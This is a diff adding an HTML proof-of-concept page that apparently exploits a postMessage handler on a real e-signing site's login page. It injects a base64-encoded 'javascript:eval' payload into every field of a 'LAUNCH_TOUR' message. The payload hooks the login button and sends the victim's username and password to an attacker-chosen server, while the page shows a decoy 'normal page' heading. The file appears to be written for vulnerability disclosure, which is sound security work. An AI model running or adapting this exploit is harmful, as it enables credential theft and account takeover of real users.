@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="UTF-8" />
+    <title>Postmessage PoC</title>
+    <script>
+      let win = window.open("https://www.yotisign.com/app/account/login");
+      let ATTACKER_SERVER = new URLSearchParams(location.search).get("ATTACKER_SERVER");
+      let payload=btoa(`var interv= setInterval(() => {
+        
+        var btn = document.getElementById("submitLocalLogin");
+        if(btn){
+          clearInterval(interv)
+          btn.onclick = () => {
+           
+            var userName = document.getElementById("username").value;
+            var password = document.getElementById("password").value;
+            fetch("${ATTACKER_SERVER}?victimUserName="+encodeURIComponent(userName)+"&victimPassword="+encodeURIComponent(password));      
+          };
+        }
+      },500)`)
+      
+      let msg =
+      {    TYPE: "LAUNCH_TOUR",    segmentsList: `javascript:eval(atob('${payload}'))//`,cssSelector: `javascript:eval(atob('${payload}'))//`,tourUuid: `javascript:eval(atob('${payload}'))//`,startIndex: `javascript:eval(atob('${payload}'))//`,skipIfWasFinished: `javascript:eval(atob('${payload}'))//`,isRedirect: `javascript:eval(atob('${payload}'))//`,tourUrl: `javascript:eval(atob('${payload}'))//`};
+   
+
+   //   let msg ={action:"redirect",redirectUrl:`javascript:eval(atob('${payload}'))//`}
+        ////'{    "action: "redirect","redirectUrl:`javascript:eval(atob(${}))//`}';
+      //msg = JSON.parse(msg);
+      setTimeout(function () {
+        win.postMessage(msg, "*");
+      }, 7000);
+
+      //
+
+      
+    </script>
+  </head>
+  <body>
+    <h1>Welcome this is a normal page !</h1>
+  </body>
+</html>
